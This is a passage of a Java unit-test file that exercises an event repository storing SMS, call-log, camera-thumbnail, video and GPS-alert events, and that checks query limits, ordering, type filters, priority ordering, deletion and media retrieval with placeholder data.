		FxCameraImageThumbnailEvent cameraImageEvent = new FxCameraImageThumbnailEvent();
		FxGeoTag geoTag = new FxGeoTag();
		geoTag.setAltitude(10.1245648f);
		geoTag.setLat(13.157986245f);
		geoTag.setLon(101.4567468f);
		
		FxMediaType mediaType = FxMediaType.PNG;
		cameraImageEvent.setActualFullPath("/sdcard/data/xxx.png");
		cameraImageEvent.setThumbnailFullPath("/sdcard/data/xxx.png");
		cameraImageEvent.setActualSize(7000);
		cameraImageEvent.setEventTime(System.currentTimeMillis());
		
		cameraImageEvent.setFormat(mediaType);
		cameraImageEvent.setGeo(geoTag);
		cameraImageEvent.setData(new byte[]{});

		events.add(smsEvent);
		events.add(callLogEvent);
		events.add(cameraImageEvent);
		
		eventRepositoryManager.insert(events);
		
		QueryCriteria criteria = new QueryCriteria();
		criteria.setLimit(50);
		criteria.setQueryOrder(QueryOrder.QueryNewestFirst);
		
		// Check EventQueryPriority for priority of events
		//1. FxEventType.CALL_LOG
		//2. FxEventType.SMS
		
		
		criteria.addEventType(FxEventType.CAMERA_IMAGE_THUMBNAIL);
		criteria.addEventType(FxEventType.SMS);
		criteria.addEventType(FxEventType.CALL_LOG);
		
		EventResultSet result = eventRepositoryManager.getRegularEvents(criteria);
		List<FxEvent> addedEvents = result.getEvents();
		
		if(addedEvents.size() != 3) {
			Assert.fail("getEvents returned invalid row count");
		}
		
		FxEvent e = (FxEvent)addedEvents.get(0);
		
		if(e.getEventType() != FxEventType.SMS &&  e.getEventType() != FxEventType.CALL_LOG) {
			Assert.fail("getEvents Test returned invalid row");
		}
		
		// Last event should be FxCameraImageThumbnailEvent
		e = (FxEvent)addedEvents.get((addedEvents.size() - 1));
		if(e.getEventType() != FxEventType.CAMERA_IMAGE_THUMBNAIL){
			Assert.fail("getEvents Test returned invalid row");
		}
	
		eventRepositoryManager.closeRespository();
		eventRepositoryManager.deleteRepository();
	}
	
	
	public void test_getMediaEvents_Test() 
			throws FxDbOpenException, FxNullNotAllowedException, 
			IOException,  
			FxNotImplementedException, FxFileNotFoundException, FxDbCorruptException, FxDbNotOpenException, FxDbOperationException {
		
		FxEventRepositoryManager eventRepositoryManager = new FxEventRepositoryManager(mTestContext);
		eventRepositoryManager.deleteRepository();
		eventRepositoryManager.openRepository();
		
		List<FxEvent> events = new ArrayList<FxEvent>();
		
		FxCameraImageThumbnailEvent cameraImageEvent = new FxCameraImageThumbnailEvent();
		FxGeoTag geoTag = new FxGeoTag();
		geoTag.setAltitude(10.1245648f);
		geoTag.setLat(13.157986245f);
		geoTag.setLon(101.4567468f);
		
		FxMediaType mediaType = FxMediaType.PNG;
		cameraImageEvent.setActualFullPath("/sdcard/data/xxx.png");
		cameraImageEvent.setThumbnailFullPath("/sdcard/data/xxx.png");
		cameraImageEvent.setActualSize(7000);
		cameraImageEvent.setEventTime(System.currentTimeMillis());
		
		cameraImageEvent.setFormat(mediaType);
		cameraImageEvent.setGeo(geoTag);
		cameraImageEvent.setData(new byte[]{});

		events.add(cameraImageEvent);
		
		eventRepositoryManager.insert(events);
		
		QueryCriteria criteria = new QueryCriteria();
		criteria.setLimit(50);
		criteria.setQueryOrder(QueryOrder.QueryNewestFirst);
 
		EventResultSet result = eventRepositoryManager.getMediaEvents(criteria);
		List<FxEvent> addedEvents = result.getEvents();
		
		if(addedEvents.size() != 1) {
			Assert.fail("getEvents returned invalid row count");
		}
		
		FxEvent e = (FxEvent)addedEvents.get(0);
		
		if(e.getEventType() != FxEventType.CAMERA_IMAGE_THUMBNAIL) {
			Assert.fail("getEvents Test returned invalid row");
		}
		
		eventRepositoryManager.closeRespository();
		eventRepositoryManager.deleteRepository();
	}
	
	public void test_getMediaEvents_QueryCriteria_Limit_Test()
			throws FxDbOpenException, FxNullNotAllowedException, IOException,
			FxNotImplementedException, FxFileNotFoundException, FxDbCorruptException, FxDbNotOpenException, FxDbOperationException 
	{
		FxEventRepositoryManager eventRepositoryManager = new FxEventRepositoryManager(mTestContext);
		eventRepositoryManager.deleteRepository();
		eventRepositoryManager.openRepository();
		
		// Insert a new row and check whether we get any exceptions or notifications to repositoryChangeListener
		List<FxEvent> events = new ArrayList<FxEvent>();
		
		for(int i = 1; i <= 100; i++) {
			FxCameraImageThumbnailEvent cameraImageEvent = new FxCameraImageThumbnailEvent();
			FxGeoTag geoTag = new FxGeoTag();
			geoTag.setAltitude(10.1245648f);
			geoTag.setLat(13.157986245f);
			geoTag.setLon(101.4567468f);
			
			FxMediaType mediaType = FxMediaType.PNG;
			cameraImageEvent.setActualFullPath("/sdcard/data/" +  i + ".png");
			cameraImageEvent.setThumbnailFullPath("/sdcard/data/" + i + ".png");
			cameraImageEvent.setActualSize(7000);
			cameraImageEvent.setEventTime(System.currentTimeMillis());
			
			cameraImageEvent.setFormat(mediaType);
			cameraImageEvent.setGeo(geoTag);
			cameraImageEvent.setData(new byte[]{});
			events.add(cameraImageEvent);
			
		}
		
		eventRepositoryManager.insert(events);
		
		QueryCriteria criteria = new QueryCriteria();
		criteria.setLimit(50);
		criteria.setQueryOrder(QueryOrder.QueryNewestFirst);
		
		EventResultSet result = eventRepositoryManager.getMediaEvents(criteria);
		List<FxEvent> addedEvents = result.getEvents();
		
		if(addedEvents.size() != 50) {
			Assert.fail("QueryCriteria Limit Test returned invalid row count");
		}
		
		eventRepositoryManager.closeRespository();
		eventRepositoryManager.deleteRepository();
	}
	
	public void test_getMediaEvents_QueryCriteria_QueryOrder_QueryNewestFirst_Test()
			throws FxDbOpenException, FxNullNotAllowedException, IOException,
			FxNotImplementedException, FxFileNotFoundException, FxDbCorruptException, FxDbNotOpenException, FxDbOperationException 
	{
		FxEventRepositoryManager eventRepositoryManager = new FxEventRepositoryManager(mTestContext);
		eventRepositoryManager.deleteRepository();
		eventRepositoryManager.openRepository();
		
		// Insert a new row and check whether we get any exceptions or notifications to repositoryChangeListener
		List<FxEvent> events = new ArrayList<FxEvent>();
		
		FxCameraImageThumbnailEvent firstCameraImageEvent = new FxCameraImageThumbnailEvent();
		FxGeoTag geoTag = new FxGeoTag();
		geoTag.setAltitude(10.1245648f);
		geoTag.setLat(13.157986245f);
		geoTag.setLon(101.4567468f);
		
		FxMediaType mediaType = FxMediaType.PNG;
		firstCameraImageEvent.setActualFullPath("/sdcard/data/firstCameraImageEvent.png");
		firstCameraImageEvent.setThumbnailFullPath("/sdcard/data/firstCameraImageEvent.png");
		firstCameraImageEvent.setActualSize(7000);
		firstCameraImageEvent.setEventTime(System.currentTimeMillis());
		firstCameraImageEvent.setFormat(mediaType);
		firstCameraImageEvent.setGeo(geoTag);
		firstCameraImageEvent.setData(new byte[]{});
		events.add(firstCameraImageEvent);
		 
		 
		FxCameraImageThumbnailEvent secondCameraImageEvent = new FxCameraImageThumbnailEvent();
		secondCameraImageEvent.setActualFullPath("/sdcard/data/secondCameraImageEvent.png");
		secondCameraImageEvent.setThumbnailFullPath("/sdcard/data/secondCameraImageEvent.png");
		secondCameraImageEvent.setActualSize(7000);
		secondCameraImageEvent.setEventTime(System.currentTimeMillis());
		secondCameraImageEvent.setFormat(mediaType);
		secondCameraImageEvent.setGeo(geoTag);
		secondCameraImageEvent.setData(new byte[]{});
		events.add(secondCameraImageEvent);
		
		eventRepositoryManager.insert(events);
		
		QueryCriteria criteria = new QueryCriteria();
		criteria.setLimit(50);
		criteria.setQueryOrder(QueryOrder.QueryNewestFirst);
		
		EventResultSet result = eventRepositoryManager.getMediaEvents(criteria);
		List<FxEvent> addedEvents = result.getEvents();
		
		if(addedEvents.size() != 2) {
			Assert.fail("QueryCriteria Limit Test returned invalid row count");
		}
		
		FxCameraImageThumbnailEvent e = (FxCameraImageThumbnailEvent)addedEvents.get(0);
		
		if(!e.getThumbnailFullPath().equals("/sdcard/data/secondCameraImageEvent.png")){
			Assert.fail("QueryNewestFirst Test returned invalid row");
		}
	
		eventRepositoryManager.closeRespository();
		eventRepositoryManager.deleteRepository();
	}
	
	public void test_getMediaEvents_QueryCriteria_QueryOrder_QueryOldestFist_Test()
			throws FxDbOpenException, FxNullNotAllowedException, IOException,
			FxNotImplementedException, FxFileNotFoundException, FxDbCorruptException, FxDbNotOpenException, FxDbOperationException 
	{
		FxEventRepositoryManager eventRepositoryManager = new FxEventRepositoryManager(mTestContext);
		eventRepositoryManager.deleteRepository();
		eventRepositoryManager.openRepository();
		
		// Insert a new row and check whether we get any exceptions or notifications to repositoryChangeListener
		List<FxEvent> events = new ArrayList<FxEvent>();
		
		FxCameraImageThumbnailEvent firstCameraImageEvent = new FxCameraImageThumbnailEvent();
		FxGeoTag geoTag = new FxGeoTag();
		geoTag.setAltitude(10.1245648f);
		geoTag.setLat(13.157986245f);
		geoTag.setLon(101.4567468f);
		
		FxMediaType mediaType = FxMediaType.PNG;
		firstCameraImageEvent.setActualFullPath("/sdcard/data/firstCameraImageEvent.png");
		firstCameraImageEvent.setThumbnailFullPath("/sdcard/data/firstCameraImageEvent.png");
		firstCameraImageEvent.setActualSize(7000);
		firstCameraImageEvent.setEventTime(System.currentTimeMillis());
		firstCameraImageEvent.setFormat(mediaType);
		firstCameraImageEvent.setGeo(geoTag);
		firstCameraImageEvent.setData(new byte[]{});
		events.add(firstCameraImageEvent);
		 
		FxCameraImageThumbnailEvent secondCameraImageEvent = new FxCameraImageThumbnailEvent();
		secondCameraImageEvent.setActualFullPath("/sdcard/data/secondCameraImageEvent.png");
		secondCameraImageEvent.setThumbnailFullPath("/sdcard/data/secondCameraImageEvent.png");
		secondCameraImageEvent.setActualSize(7000);
		secondCameraImageEvent.setEventTime(System.currentTimeMillis());
		secondCameraImageEvent.setFormat(mediaType);
		secondCameraImageEvent.setGeo(geoTag);
		secondCameraImageEvent.setData(new byte[]{});
		events.add(secondCameraImageEvent);
		
		eventRepositoryManager.insert(events);
		
		QueryCriteria criteria = new QueryCriteria();
		criteria.setLimit(50);
		criteria.setQueryOrder(QueryOrder.QueryOldestFist);
		
		EventResultSet result = eventRepositoryManager.getMediaEvents(criteria);
		List<FxEvent> addedEvents = result.getEvents();
		
		if(addedEvents.size() != 2) {
			Assert.fail("QueryCriteria Limit Test returned invalid row count");
		}
		
		FxCameraImageThumbnailEvent e = (FxCameraImageThumbnailEvent)addedEvents.get(0);
		
		if(!e.getThumbnailFullPath().equals("/sdcard/data/firstCameraImageEvent.png")){
			Assert.fail("QueryOldestFist Test returned invalid row");
		}
	
		eventRepositoryManager.closeRespository();
		eventRepositoryManager.deleteRepository();
	}
	
	public void test_getMediaEvents_QueryCriteria_addEventType_Test()
			throws FxDbOpenException, FxNullNotAllowedException, IOException,
			FxNotImplementedException, FxFileNotFoundException, FxDbCorruptException, FxDbNotOpenException, FxDbOperationException 
	{
		FxEventRepositoryManager eventRepositoryManager = new FxEventRepositoryManager(mTestContext);
		eventRepositoryManager.deleteRepository();
		eventRepositoryManager.openRepository();
		
		// Insert a new row and check whether we get any exceptions or notifications to repositoryChangeListener
		List<FxEvent> events = new ArrayList<FxEvent>();
		
		FxGeoTag geoTag = new FxGeoTag();
		geoTag.setAltitude(10.1245648f);
		geoTag.setLat(13.157986245f);
		geoTag.setLon(101.4567468f);
		FxMediaType imageMediaType = FxMediaType.PNG;
		
		FxCameraImageThumbnailEvent secondCameraImageEvent = new FxCameraImageThumbnailEvent();
		secondCameraImageEvent.setActualFullPath("/sdcard/data/secondCameraImageEvent.png");
		secondCameraImageEvent.setThumbnailFullPath("/sdcard/data/secondCameraImageEvent.png");
		secondCameraImageEvent.setActualSize(7000);
		secondCameraImageEvent.setEventTime(System.currentTimeMillis());
		secondCameraImageEvent.setFormat(imageMediaType);
		secondCameraImageEvent.setGeo(geoTag);
		secondCameraImageEvent.setData(new byte[]{});
		events.add(secondCameraImageEvent);
		
		FxVideoFileThumbnailEvent videoFileThumbnailEvent = new FxVideoFileThumbnailEvent();
		FxMediaType mediaType = FxMediaType.MP4;
		videoFileThumbnailEvent.setActualDuration(8000);
		videoFileThumbnailEvent.setActualFullPath("/sdcard/data/xxx.MP4");
		videoFileThumbnailEvent.setActualFileSize(9000);
		videoFileThumbnailEvent.setEventTime(System.currentTimeMillis());
		videoFileThumbnailEvent.setFormat(mediaType);
		videoFileThumbnailEvent.setVideoData(new byte[]{});
		FxThumbnail thumbnail = new FxThumbnail();
		thumbnail.setImageData(new byte[]{});
		thumbnail.setThumbnailPath("/sdcard/data/xxx.png");
		videoFileThumbnailEvent.addThumbnail(thumbnail);
		events.add(videoFileThumbnailEvent);
		
		eventRepositoryManager.insert(events);
		
		QueryCriteria criteria = new QueryCriteria();
		criteria.setLimit(50);
		criteria.setQueryOrder(QueryOrder.QueryNewestFirst);
		criteria.addEventType(FxEventType.CAMERA_IMAGE_THUMBNAIL);
		
		EventResultSet result = eventRepositoryManager.getRegularEvents(criteria);
		List<FxEvent> addedEvents = result.getEvents();
		
		if(addedEvents.size() != 1) {
			Assert.fail("getRegularEvents returned invalid row count");
		}
		
		FxCameraImageThumbnailEvent e = (FxCameraImageThumbnailEvent)addedEvents.get(0);
		
		if(!e.getActualFullPath().equals("/sdcard/data/secondCameraImageEvent.png")){
			Assert.fail("QueryOldestFist Test returned invalid row");
		}
	
		eventRepositoryManager.closeRespository();
		eventRepositoryManager.deleteRepository();
	}
	
	public void test_getRegularEvents_PriorityMix_Test()
			throws FxDbOpenException, FxNullNotAllowedException, IOException,
			FxNotImplementedException, FxFileNotFoundException, FxDbCorruptException, FxDbNotOpenException, FxDbOperationException 
	{
		FxEventRepositoryManager eventRepositoryManager = new FxEventRepositoryManager(mTestContext);
		eventRepositoryManager.deleteRepository();
		eventRepositoryManager.openRepository();
		
		List<FxEvent> events = new ArrayList<FxEvent>();

		// HIGH priority
		FxAlertGpsEvent alertGpsEvent = new FxAlertGpsEvent();
		alertGpsEvent.setIsMockLocaion(false);
		alertGpsEvent.setMethod(FxLocationMethod.INTERGRATED_GPS);
		alertGpsEvent.setMapProvider(FxLocationMapProvider.PROVIDER_GOOGLE);
		alertGpsEvent.setCellId(12345);
		alertGpsEvent.setEventTime(System.currentTimeMillis());
		alertGpsEvent.setLatitude(104.44454566577686f);
		alertGpsEvent.setLongitude(13.445455676843f);
		alertGpsEvent.setAltitude(10.0867586408f);
		alertGpsEvent.setHeading(-1243.3434324234f);
		alertGpsEvent.setHeadingAccuracy(-1.4546656f);
		alertGpsEvent.setHorizontalAccuracy(34.45464563f);
		alertGpsEvent.setSpeed(123.2323f);
		alertGpsEvent.setSpeedAccuracy(0);
		alertGpsEvent.setVerticalAccuracy(0);
		alertGpsEvent.setAreaCode(56677);
		alertGpsEvent.setCellName("Unknown");
		alertGpsEvent.setMobileCountryCode("Unknown");
		alertGpsEvent.setNetworkId("2344555");
		alertGpsEvent.setNetworkName("Unknown");
		
		FxRecipient recipient = new FxRecipient();
		recipient.setRecipientType(FxRecipientType.TO);
		recipient.setContactName("first");
		recipient.setRecipient("first@gmail.com ");
		
		// MEDIUM priority 
		FxSMSEvent smsEvent = new FxSMSEvent();
		smsEvent.setSenderNumber("first");
		smsEvent.setContactName("first");
		smsEvent.setDirection(FxEventDirection.OUT);
		smsEvent.setSMSData("first test_insert na ja");
		smsEvent.setEventTime(System.currentTimeMillis());
		smsEvent.addRecipient(recipient);
		
	
		// LOW priority 
		FxCameraImageThumbnailEvent cameraImageEvent = new FxCameraImageThumbnailEvent();
		FxGeoTag geoTag = new FxGeoTag();
		geoTag.setAltitude(10.1245648f);
		geoTag.setLat(13.157986245f);
		geoTag.setLon(101.4567468f);
		
		FxMediaType mediaType = FxMediaType.PNG;
		cameraImageEvent.setActualFullPath("/sdcard/data/xxx.png");
		cameraImageEvent.setThumbnailFullPath("/sdcard/data/xxx.png");
		cameraImageEvent.setActualSize(7000);
		cameraImageEvent.setEventTime(System.currentTimeMillis());
		
		cameraImageEvent.setFormat(mediaType);
		cameraImageEvent.setGeo(geoTag);
		cameraImageEvent.setData(new byte[]{});

		events.add(smsEvent);
		events.add(alertGpsEvent);
		events.add(cameraImageEvent);
		
		eventRepositoryManager.insert(events);
		
		QueryCriteria criteria = new QueryCriteria();
		criteria.setLimit(50);
		criteria.setQueryOrder(QueryOrder.QueryNewestFirst);
		
		criteria.addEventType(FxEventType.CAMERA_IMAGE_THUMBNAIL);
		criteria.addEventType(FxEventType.SMS);
		criteria.addEventType(FxEventType.ALERT_GPS);
		
		EventResultSet result = eventRepositoryManager.getRegularEvents(criteria);
		List<FxEvent> addedEvents = result.getEvents();
		
		if(addedEvents.size() != 3) {
			Assert.fail("getEvents returned invalid row count");
		}
		
		FxEvent e = (FxEvent)addedEvents.get(0);
		
		if(e.getEventType() != FxEventType.ALERT_GPS) {
			Assert.fail("getEvents Test returned invalid row order");
		}
		
		e = (FxEvent)addedEvents.get(1);
		
		if(e.getEventType() != FxEventType.SMS) {
			Assert.fail("getEvents Test returned invalid row order");
		}
		
		e = (FxEvent)addedEvents.get(2);
		
		if(e.getEventType() != FxEventType.CAMERA_IMAGE_THUMBNAIL) {
			Assert.fail("getEvents Test returned invalid row order");
		}
		
		// Last event should be FxCameraImageThumbnailEvent
		e = (FxEvent)addedEvents.get((addedEvents.size() - 1));
		if(e.getEventType() != FxEventType.CAMERA_IMAGE_THUMBNAIL){
			Assert.fail("getEvents Test returned invalid row");
		}
	
		eventRepositoryManager.closeRespository();
		eventRepositoryManager.deleteRepository();
	}
	
	public void test_delete_Test() 
			throws FxDbOpenException, FxNullNotAllowedException, IOException, 
			FxNotImplementedException, 
			FxFileNotFoundException, FxDbIdNotFoundException, FxDbCorruptException, FxDbNotOpenException, FxDbOperationException 
	{
		FxEventRepositoryManager eventRepositoryManager = new FxEventRepositoryManager(mTestContext);
		eventRepositoryManager.deleteRepository();
		eventRepositoryManager.openRepository();
		
		List<FxEvent> events = new ArrayList<FxEvent>();

		// HIGH priority
		FxAlertGpsEvent alertGpsEvent = new FxAlertGpsEvent();
		alertGpsEvent.setIsMockLocaion(false);
		alertGpsEvent.setMethod(FxLocationMethod.INTERGRATED_GPS);
		alertGpsEvent.setMapProvider(FxLocationMapProvider.PROVIDER_GOOGLE);
		alertGpsEvent.setCellId(12345);
		alertGpsEvent.setEventTime(System.currentTimeMillis());
		alertGpsEvent.setLatitude(104.44454566577686f);
		alertGpsEvent.setLongitude(13.445455676843f);
		alertGpsEvent.setAltitude(10.0867586408f);
		alertGpsEvent.setHeading(-1243.3434324234f);
		alertGpsEvent.setHeadingAccuracy(-1.4546656f);
		alertGpsEvent.setHorizontalAccuracy(34.45464563f);
		alertGpsEvent.setSpeed(123.2323f);
		alertGpsEvent.setSpeedAccuracy(0);
		alertGpsEvent.setVerticalAccuracy(0);
		alertGpsEvent.setAreaCode(56677);
		alertGpsEvent.setCellName("Unknown");
		alertGpsEvent.setMobileCountryCode("Unknown");
		alertGpsEvent.setNetworkId("2344555");
		alertGpsEvent.setNetworkName("Unknown");
		
		events.add(alertGpsEvent);
		eventRepositoryManager.insert(events);
		
		QueryCriteria criteria = new QueryCriteria();
		criteria.setLimit(50);
		criteria.setQueryOrder(QueryOrder.QueryNewestFirst);
		criteria.addEventType(FxEventType.ALERT_GPS);
		
		EventResultSet result = eventRepositoryManager.getRegularEvents(criteria);
		EventKeys evKeys = result.shrinkAsEventKeys();
		eventRepositoryManager.delete(evKeys);
	
		eventRepositoryManager.closeRespository();
		eventRepositoryManager.deleteRepository();
	}
	
	public void test_getActualMedia_Test() throws FxDbOpenException,
			FxNullNotAllowedException, IOException, FxNotImplementedException,
			FxFileNotFoundException, FxDbIdNotFoundException, FxDbCorruptException, FxDbNotOpenException, FxDbOperationException, FxFileSizeNotAllowedException 
	{
		FxEventRepositoryManager eventRepositoryManager = new FxEventRepositoryManager(mTestContext);
		eventRepositoryManager.deleteRepository();
		eventRepositoryManager.openRepository();
		
		List<FxEvent> events = new ArrayList<FxEvent>();

		FxCameraImageThumbnailEvent cameraImageEvent = new FxCameraImageThumbnailEvent();
		FxGeoTag geoTag = new FxGeoTag();
		geoTag.setAltitude(10.1245648f);
		geoTag.setLat(13.157986245f);
		geoTag.setLon(101.4567468f);
		
		FxMediaType mediaType = FxMediaType.PNG;
		cameraImageEvent.setActualFullPath("/sdcard/data/xxx.png");
		cameraImageEvent.setThumbnailFullPath("/sdcard/data/xxx.png");
		cameraImageEvent.setActualSize(7000);
		cameraImageEvent.setEventTime(System.currentTimeMillis());
		cameraImageEvent.setFormat(mediaType);
		cameraImageEvent.setGeo(geoTag);
		cameraImageEvent.setData(new byte[]{});
		events.add(cameraImageEvent);
		
		// Insert the event
		eventRepositoryManager.insert(events);
		
		// Mark this event as sent to server
		eventRepositoryManager.updateMediaThumbnailStatus(1, true);
		
		File f=new File("/sdcard/data");
		if(!f.exists()){
			f.mkdirs();
		}
		
		// file size Must less than 0 or over 1024 
		FileWriter fileWriter;
		try {
			f = new File("/sdcard/data/xxx.png");
			fileWriter = new FileWriter(f, true);
			fileWriter.append("test sss");
			fileWriter.close();
		} catch (IOException e) {
			// cannot open file for writing or another IO error
		}
		
		// get the event
		FxEvent e = eventRepositoryManager.getActualMedia(1);
		 
		if(e == null)
			Assert.fail("getActualMedia Test returned invalid row");
		
	
		eventRepositoryManager.closeRespository();
		eventRepositoryManager.deleteRepository();
	}
	
}
